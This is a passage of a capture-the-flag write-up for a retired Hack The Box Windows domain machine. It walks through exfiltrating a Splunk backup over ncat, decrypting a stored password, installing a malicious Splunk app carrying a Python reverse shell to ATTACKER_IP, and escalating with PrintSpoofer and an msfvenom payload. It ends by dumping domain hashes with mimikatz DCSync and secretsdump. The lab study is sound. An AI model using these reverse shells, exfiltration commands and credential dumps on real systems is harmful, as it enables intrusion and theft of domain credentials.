*Evil-WinRM* PS C:\Users\edward.martin\Documents> tree C:\Users\edward.martin /a /f
Folder PATH listing
Volume serial number is 000001E8 3985:943C
C:\USERS\EDWARD.MARTIN
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```

The flag was printed and submitted.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> type C:\Users\edward.martin\Desktop\user.txt
538cc14efa48308f6c0654a2c9cd8be0
```

## alexander.green

### Recon

#### Splunk backup file

The `C:\` directory was enumerated, revealing a `Backups` folder. 
As a member of the `Backup_Reviewers` group, `edward.martin` had read access to this folder, confirmed via `icacls`.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> ls \


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:32 AM                Backups
d-----         3/25/2025   2:06 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          3/4/2025  11:28 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         6/28/2025   9:54 AM                Users
d-----         3/25/2025   2:15 PM                Windows

*Evil-WinRM* PS C:\Users\edward.martin\Documents> icacls C:\Backups
C:\Backups HAZE\Backup_Reviewers:(OI)(CI)(RX)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(OI)(CI)(F)
           BUILTIN\Administrators:(OI)(CI)(F)
```

The folder contains a Splunk backup.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cd \Backups\Splunk
*Evil-WinRM* PS C:\Backups\Splunk> ls


    Directory: C:\Backups\Splunk


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
```

`ncat.exe` can once again be used to download the file from the target to the attack host.
A `loot` directory is created on Kali and a Python web server is started to serve `ncat.exe`.
```
fcoomans@kali:~/htb/haze$ mkdir loot

fcoomans@kali:~/htb/haze$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`ncat.exe` was downloaded on the target.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> iwr http://ATTACKER_IP/ncat.exe -outfile ncat.exe
```

`ncat` listener was started to receive the file and write it to `loot/splunk.zip`.
```
fcoomans@kali:~/htb/haze$ ncat -lnp 4444 --recv-only >loot/splunk.zip
```

`ncat.exe` sent the file to the Kali `ncat` listener. 
The file hash was also retrieved.
```
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cmd /c "ncat.exe ATTACKER_IP 4444 --send-only <C:\Backups\Splunk\splunk_backup_2024-08-06.zip"
*Evil-WinRM* PS C:\Users\edward.martin\Documents> get-filehash C:\Backups\Splunk\splunk_backup_2024-08-06.zip

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          771CAEC716410DB9023F47969547A2C38471AD5D09ECC5C2468A0B66E1893BBA       C:\Backups\Splunk\splunk_backup_2024-08-06.zip
```

Running `sha256sum` on the file on the attack host shows that the transfer was successful without any corruptions.
```
fcoomans@kali:~/htb/haze/loot$ sha256sum splunk.zip
771caec716410db9023f47969547a2c38471ad5d09ecc5c2468a0b66e1893bba  splunk.zip
```

The backup file was then unzipped.
```
fcoomans@kali:~/htb/haze/loot$ unzip splunk.zip
Archive:  splunk.zip
   creating: Splunk/
   creating: Splunk/bin/
<SNIP>
```

#### Authentication credentials

I enumerated the files and found a `$1$` encrypted password for `alexander.green`.
```
fcoomans@kali:~/htb/haze/loot$ cat Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0


[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```

`splunksecrets` was once again used to decrypt the encrypted password using the `/etc/auth/splunk.secret` file.  The decrypted password is `Sp1unkadmin@2k24`.
```
fcoomans@kali:~/htb/haze/loot$ . ../splunksecrets/bin/activate

(splunksecrets)fcoomans@kali:~/htb/haze/loot$ splunksecrets splunk-decrypt -S Splunk/etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
Sp1unkadmin@2k24

(splunksecrets)fcoomans@kali:~/htb/haze/loot$ deactivate
```

I test the credentials with `nxc`, but it fails.
```
fcoomans@kali:~/htb/haze/loot$ nxc ldap dc01.haze.htb -u alexander.green -p Sp1unkadmin@2k24
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [-] haze.htb\alexander.green:Sp1unkadmin@2k24
```

But then I remembered that Alexander is a member of the `Splunk_Admins` group.  So perhaps this is the Splunk `admin` account.

### Exploitation

The password was tried to log into Splunk as the `admin` user on http://dc01.haze.htb:8000.

![](images/Pasted%20image%2020250628133737.png)

And it worked!

![](images/Pasted%20image%2020250628133843.png)

#### Malicious Splunk App

I researched how to compromise Splunk and found that a malicious App containing a reverse shell could be installed to launch a reverse shell.
https://github.com/DimopoulosElias/SplunkAppShell has an example of this.

The repo was cloned.
```
fcoomans@kali:~/htb/haze$ git clone https://github.com/DimopoulosElias/SplunkAppShell.git
Cloning into 'SplunkAppShell'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
```

And the `rce.tgz` file was extracted.  It contains a python script and a conf file.
```
fcoomans@kali:~/htb/haze$ cd SplunkAppShell

fcoomans@kali:~/htb/haze/SplunkAppShell$ tar xvzf rce.tgz
upload_app_exec/
upload_app_exec/default/
upload_app_exec/default/inputs.conf
upload_app_exec/bin/
upload_app_exec/bin/reverse_shell.py

fcoomans@kali:~/htb/haze/SplunkAppShell$ tree upload_app_exec
upload_app_exec
├── bin
│   └── reverse_shell.py
└── default
    └── inputs.conf

3 directories, 2 files
```

The conf file appears to contain the script to be used for the App on both Windows and Linux.
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ cat upload_app_exec/default/inputs.conf
[script://.\bin\reverse_shell.py]
disabled = 0
interval = 10
sourcetype = windows

[script://./bin/reverse_shell.py]
disabled = 0
interval = 10
sourcetype = linux
```

The script contains a reverse shell.  
I tried this package after updating the IP, but the reverse shell kept closing.
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ cat upload_app_exec/bin/reverse_shell.py
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.2.3', 8081))

while True:
    command = s.recv(1024)
    win_lin_shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send( win_lin_shell.stdout.read() )
    s.send( win_lin_shell.stderr.read() )
```

I used https://www.revshells.com to generate a Python reverse shell for Windows and noticed that the script had to specify what shell to start (PowerShell in the image below).

![](images/Pasted%20image%2020250628135027.png)

While testing `rce.tgz` I noticed that the `upload_app_exec` is simply the name of the Splunk App.  I renamed this directory to `revshell`.
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ mv upload_app_exec revshell

fcoomans@kali:~/htb/haze/SplunkAppShell$ tree revshell
revshell
├── bin
│   └── reverse_shell.py
└── default
    └── inputs.conf

3 directories, 2 files
```

The https://www.revshells.com reverse shell payload was then inserted in the `bin/reverse_shell.py` file.
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ cat revshell/bin/reverse_shell.py
import os
import socket
import subprocess
import threading


def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()


def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 4444))

p = subprocess.Popen(
    ["powershell"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    stdin=subprocess.PIPE,
)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

A gzipped tar file containing the `revshell` app was created. 
The [Malicious Splunk App Directory](splunk_app/) in this repo contains the necessary files:
- `reverse_shell.py`: A Python script that spawns a PowerShell-based reverse shell to `ATTACKER_IP:4444`.
- `inputs.conf`: Configures the app to execute the script on Windows every 10 seconds.
Alternatively, use https://github.com/DimopoulosElias/SplunkAppShell as a reference for creating Splunk apps. 

To recreate `revshell.tgz` change to the `splunk_app/` directory in the repo, update `ATTACKER_IP` in `reverse_shell.py` and run the tar command:
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ tar cvzf revshell.tgz revshell
revshell/
revshell/bin/
revshell/bin/reverse_shell.py
revshell/default/
revshell/default/inputs.conf
```

A `ncat` listener was started on the attack host.
```
fcoomans@kali:~/htb/haze$ rlwrap ncat -lvnp 4444
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

`Manage Apps` was opened on the Splunk console.

![](images/Pasted%20image%2020250628135817.png)

`Install app from file` was then clicked.

![](images/Pasted%20image%2020250628135909.png)

The `revshell.tgz` file was uploaded as a new Splunk App.  The server doesn't have to be restarted, when prompted.

![](images/Pasted%20image%2020250628140027.png)

The `ncat` listener immediately caught the reverse shell.
```
fcoomans@kali:~/htb/haze/SplunkAppShell$ rlwrap ncat -lvnp 4444
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.61:51362.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
haze\alexander.green
PS C:\Windows\system32> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.61
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

### Post Exploitation

Running `whoami /priv` shows that Alexander has `SeImpersonatePrivilege`.  
A 'Potato' attack, such as `PrintSpoofer`, can be used to exploit `SeImpersonatePrivilege` to impersonate a privileged account like `SYSTEM`.
```
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Splunk kept removing the App and dropping the reverse shell after a short period.  
This was annoying, but gave me enough time to Privilege Escalate to Administrator.
I just re-install the reverse shell App, when the reverse shell was dropped, which re-established the connection.

## Administrator

### Exploitation

`PrintSpoofer` (https://github.com/itm4n/PrintSpoofer) will be used to escalate privileges and then run a reverse shell.
The high-level account can then run `mimikatz` to dump the Administrator credentials.

A reverse shell executable is generated using `msfvenom`. 
The `PrintSpoofer64.exe` executable was also downloaded from Releases on the repo page and copied to the `www` directory.
```
fcoomans@kali:~/htb/haze$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 EXITFUNC=thread -f exe -o www/revshell.exe
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: www/revshell.exe
```

`mimikatz.exe` (part of the `mimikatz` package on Kali) was also copied to the `www` directory.
```
fcoomans@kali:~/htb/haze$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe

fcoomans@kali:~/htb/haze$ dpkg -S /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
mimikatz: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

fcoomans@kali:~/htb/haze$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe www
```

A Python web server was started to serve `mimikatz` and `PrintSpoofer`.
```
fcoomans@kali:~/htb/haze$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`revshell.exe` and `PrintSpoofer64.exe` were then downloaded to Alexander's temp folder.
```
PS C:\Windows\system32> cd $env:temp
cd $env:temp
PS C:\Users\alexander.green\AppData\Local\Temp> iwr http://ATTACKER_IP:8000/PrintSpoofer64.exe -outfile PrintSpoofer.exe
iwr http://ATTACKER_IP:8000/PrintSpoofer64.exe -outfile PrintSpoofer.exe
PS C:\Users\alexander.green\AppData\Local\Temp> iwr http://ATTACKER_IP:8000/revshell.exe -outfile revshell.exe
iwr http://ATTACKER_IP:8000/revshell.exe -outfile revshell.exe
```

A second `ncat` listener is started on Kali.  
This time it's listening on port 4445, as there is already another listener on port 4444 that accepts the Splunk App reverse shell.
```
fcoomans@kali:~/htb/cat$ rlwrap ncat -lvnp 4445
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4445
Ncat: Listening on 0.0.0.0:4445
```

`PrintSpoofer` was executed to abuse `SeImpersonatePrivilege` and then ran `revshell.exe` as the elevated user.
```
PS C:\Users\alexander.green\AppData\Local\Temp> .\PrintSpoofer.exe -c "revshell.exe"
.\PrintSpoofer.exe -c "revshell.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[+] CreateProcessWithTokenW() OK
```

The `ncat` listener immediately caught the reverse shell from the `DC01$` computer account.
```
fcoomans@kali:~/htb/cat$ rlwrap ncat -lvnp 4445
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.11.61:51758.
Microsoft Windows [Version 10.0.20348.3328]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
haze\dc01$

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.61
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

BloodHound shows that this account can `DCSync` the `HAZE.HTB` domain.  
The `Windows Abuse` section shows that `mimikatz` can be used to dump the Administrator NTLM hash.

![](images/Pasted%20image%2020250628142908.png)

### Privilege Escalation

I changed to the `%temp%` folder and used PowerShell's `Invoke-WebRequest` (`iwr`) to download `mimikatz.exe` from the attack host.
```
C:\Windows\system32>cd %temp%
cd %temp%

C:\Windows\Temp>powershell -c "iwr http://ATTACKER_IP:8000/mimikatz.exe -outfile mimikatz.exe"
powershell -c "iwr http://ATTACKER_IP:8000/mimikatz.exe -outfile mimikatz.exe"
```

`mimikatz` was run and the Domain Administrator's NTLM hash was dumped.
```
C:\Windows\Temp>powershell -c "iwr http://ATTACKER_IP:8000/mimikatz.exe -outfile mimikatz.exe"
powershell -c "iwr http://ATTACKER_IP:8000/mimikatz.exe -outfile mimikatz.exe"

C:\Windows\Temp>mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : HAZE\DC01$

608     {0;000003e7} 1 D 44554          HAZE\DC01$      S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00e74497} 0 D 15929577    NT AUTHORITY\SYSTEM     S-1-5-18        (16g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 15969475    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'haze.htb' will be the domain
[DC] 'dc01.haze.htb' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/20/2025 2:34:49 PM
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 06dc954d32cb91ac2831d67e3e12027f
    ntlm- 0: 06dc954d32cb91ac2831d67e3e12027f
    ntlm- 1: 060222100e2edc0a5e173b4027d0d7ae
    lm  - 0: 7a67f9a840029ea3ee20148e0751b022

<SNIP>

mimikatz(commandline) # exit
Bye!
```

`nxc` confirmed that the NTLM hash is it valid!
```
fcoomans@kali:~/htb/haze$ nxc ldap dc01.haze.htb -u Administrator -H 06dc954d32cb91ac2831d67e3e12027f
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\Administrator:06dc954d32cb91ac2831d67e3e12027f (Pwn3d!)
```

I used `evil-winrm` to log into `dc01.haze.htb` as the Domain Administrator, using this NTLM hash.
```
fcoomans@kali:~/htb/haze$ evil-winrm -i dc01.haze.htb -u Administrator -H 06dc954d32cb91ac2831d67e3e12027f

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
haze\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.61
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

### Post Exploitation

#### impacket-secretsdump

To completely compromise the domain, I also ran `impacket-secretsdump` to dump the very important `krbtgt` NTLM hash.  
This hash can be used to generate Golden Tickets and grants persistent Domain Compromise even if all other user passwords are changed.
```
fcoomans@kali:~/htb/haze$ impacket-secretsdump -hashes :06dc954d32cb91ac2831d67e3e12027f -just-dc "HAZE/Administrator@10.10.11.61"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06dc954d32cb91ac2831d67e3e12027f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:937e28202a6cdfcc556d1b677bcbe82c:::
<SNIP>
[*] Cleaning up...
```

#### root.txt flag

The Administrator is the holder of the `root.txt` flag.
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> tree C:\Users\Administrator /a /f
Folder PATH listing
Volume serial number is 000001F3 3985:943C
C:\USERS\ADMINISTRATOR
+---.splunk
|       authToken_dc01_8089
|
+---3D Objects
+---Contacts
+---Desktop
|       root.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       cleaning_up.ps1
|       Desktop.lnk
|       Downloads.lnk
|       SpluckCleanup.ps1
|       SupportServices_acl.txt
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

The `root.txt` flag is captured and submitted.
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
f9c3c7fa638b8c326b9e69788a735c6a
```

And `Haze has been Pwned!`

![](images/Pasted%20image%2020250628144542.png)

## Lessons Learned
- **Splunk Exploitation**: Gained familiarity with Splunk’s directory structure (e.g., `/etc/auth/splunk.secret`), password decryption using `splunksecrets`, and malicious app uploads for code execution.
- **gMSA Misconfigurations**: Learned to identify and exploit misconfigured gMSA permissions (e.g., `PrincipalsAllowedToRetrieveManagedPassword`) using `PowerView` and `impacket` tools.
- **ADCS and Kerberos**: Mastered ADCS certificate abuse with `pywhisker` and Kerberos TGT retrieval with `PKINITtools` for NTLM hash extraction.

# Disclaimer

This writeup is for educational purposes only and covers a retired HTB machine. All passwords, flags, and IPs shown are part of the retired lab environment. My username used in this report matches my GitHub handle and is intentionally shown as part of my cybersecurity brand.
